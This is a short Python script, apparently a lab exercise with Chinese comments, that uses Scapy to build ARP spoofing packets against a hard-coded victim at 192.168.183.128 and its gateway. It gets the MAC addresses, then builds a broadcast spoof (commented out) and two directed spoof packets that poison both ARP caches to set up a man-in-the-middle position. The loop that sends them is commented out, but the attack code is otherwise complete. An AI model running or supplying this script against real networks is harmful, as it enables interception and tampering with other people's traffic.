from scapy.all import *
import sys
import socket
import uuid
import time
import argparse



'''目标ip,mac'''
rip='192.168.183.128'
rmac=getmacbyip('192.168.183.128')
gateip="192.168.183.2"
gatemac=getmacbyip(gateip)
print(gatemac)
#获取本机ip,mac
ip=socket.gethostbyname(socket.gethostname())
mac=":".join([hex(uuid.getnode())[-12:][i:i+2] for i in range(0,11,2)])


####广播欺骗
#pkt = Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=mac,psrc=ip,op=2)

####定向欺骗
pkt1=Ether(src=mac,dst=rmac)/ARP(hwsrc=mac,psrc=gateip,hwdst=rmac,pdst=rip,op=2)
pkt2=Ether(src=mac,dst=gatemac)/ARP(hwsrc=mac,psrc=rip,hwdst=gatemac,pdst=gateip,op=2)

# while 1:
#     sendp(pkt1,iface='eth0',verbose=False)
#     sendp(pkt2,iface='eth0',verbose=False)
#     time.sleep(1)